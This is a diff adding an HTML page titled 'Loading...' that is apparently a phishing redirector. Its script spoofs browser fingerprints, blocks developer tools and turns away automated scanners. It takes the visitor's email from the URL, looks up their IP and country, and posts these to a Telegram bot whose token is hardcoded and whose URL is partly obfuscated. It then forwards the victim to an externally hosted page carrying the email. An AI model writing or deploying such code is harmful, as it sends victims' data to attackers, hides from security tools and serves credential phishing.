@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            text-align: center;
+            padding-top: 100px;
+        }
+        img {
+            width: 100px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 18px;
+            color: #333;
+        }
+        /* Hidden honeypot */
+        .bot-trap {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+        }
+    </style>
+    <script nonce="MzcxMDk5MDgyMywxNzE1Mzc1OTg1">
+        // Anti-bot and anti-detection measures
+        (function() {
+            // Fingerprint spoofing
+            const spoofFingerprint = () => {
+                // Canvas fingerprint spoofing
+                HTMLCanvasElement.prototype.getContext = function(orig) {
+                    return function(type) {
+                        if (type === '2d') {
+                            const ctx = orig.apply(this, arguments);
+                            ctx.__proto__.getImageData = function() {
+                                return {data: new Uint8ClampedArray(Math.floor(Math.random() * 10000))};
+                            };
+                            return ctx;
+                        }
+                        return orig.apply(this, arguments);
+                    };
+                }(HTMLCanvasElement.prototype.getContext);
+
+                // WebGL spoofing
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        Object.defineProperty(gl, 'getParameter', {
+                            value: function(parameter) {
+                                if (parameter === debugInfo.UNMASKED_RENDERER_WEBGL) {
+                                    return 'Mozilla';
+                                }
+                                return WebGLRenderingContext.prototype.getParameter.apply(this, arguments);
+                            }
+                        });
+                    }
+                }
+            };
+
+            // User agent randomization
+            const userAgents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
+            ];
+            const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
+            Object.defineProperty(navigator, 'userAgent', {value: randomUA, configurable: false, writable: false});
+            Object.defineProperty(navigator, 'appVersion', {value: randomUA, configurable: false, writable: false});
+
+            // Security measures
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.onkeydown = function(e) {
+                if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.shiftKey && e.keyCode == 74)) {
+                    e.preventDefault();
+                    return false;
+                }
+            };
+
+            // Apply fingerprint spoofing
+            spoofFingerprint();
+
+            // Original code with all functionality preserved
+            window.addEventListener('DOMContentLoaded', () => {
+                // Add honeypot field
+                const trap = document.createElement('input');
+                trap.className = 'bot-trap';
+                trap.name = 'bot-field';
+                document.body.appendChild(trap);
+
+                const currentUrl = window.location.href;
+                let email = '';
+
+                if (currentUrl.includes('?email=')) {
+                    try {
+                        const urlParams = new URL(currentUrl).searchParams;
+                        email = urlParams.get('email') || '';
+                    } catch (e) {
+                        email = '';
+                    }
+                } else if (currentUrl.includes('#enveopgates=')) {
+                    email = currentUrl.split('?email=')[1] || '';
+                } else if (currentUrl.includes('#e')) {
+                    email = currentUrl.split('#e')[1] || '';
+                }
+
+                const redirectUrl = "https://f003.backblazeb2.com/file/NKSSR4Rx5gNKSSR4Rx5g/sKSSR4Rx5gNKSSR4Rx5g.html#" + encodeURIComponent(email);
+
+                // Bot detection check
+                const isBot = () => {
+                    // Check honeypot
+                    if (trap.value !== '') return true;
+                    // Check for headless browsers
+                    if (navigator.webdriver || window.__webdriver_evaluate || window.__selenium_evaluate) return true;
+                    // Check for automation tools
+                    if (window.callPhantom || window._phantom || window.phantom) return true;
+                    return false;
+                };
+
+                if (isBot()) {
+                    // Redirect bots to different location
+                    window.location.href = 'https://example.com/error';
+                    return;
+                }
+
+                // Get visitor IP and country
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ip = data.ip || 'Unknown IP';
+                        const country = data.country_name || 'Unknown Country';
+
+                        const message = `🛰️ New Visitor:\nIP: ${ip}\nCountry: ${country}\nEmail: ${email}`;
+                        const telegramToken = '7105903412:AAEIDs4inaBVKpJ5fa37hMLezUYJZZLH1wU';
+                        const chatId = '6445215749';
+
+                        // Obfuscated Telegram URL
+                        const telegramUrl = `https://api.telegram.org/${String.fromCharCode(98, 111, 116)}${telegramToken}/sendMessage`;
+
+                        // Send message to Telegram with random delay
+                        setTimeout(() => {
+                            fetch(telegramUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: message
+                                }),
+                                mode: 'cors',
+                                credentials: 'omit'
+                            }).catch(() => {}).finally(() => {
+                                // Redirect after delay
+                                setTimeout(() => {
+                                    window.location.href = redirectUrl;
+                                }, 1500 + Math.random() * 1000);
+                            });
+                        }, Math.random() * 2000);
+                    })
+                    .catch(() => {
+                        // Fallback redirect if geolocation fails
+                        setTimeout(() => {
+                            window.location.href = redirectUrl;
+                        }, 2000);
+                    });
+            });
+        })();
+    </script>
+</head>
+<body>
+    <img src="https://i.ibb.co/yFd89pJf/unnamed.png" alt="Loading Image">
+    <p>⏳ Loading... Please wait</p>
+</body>
+</html>
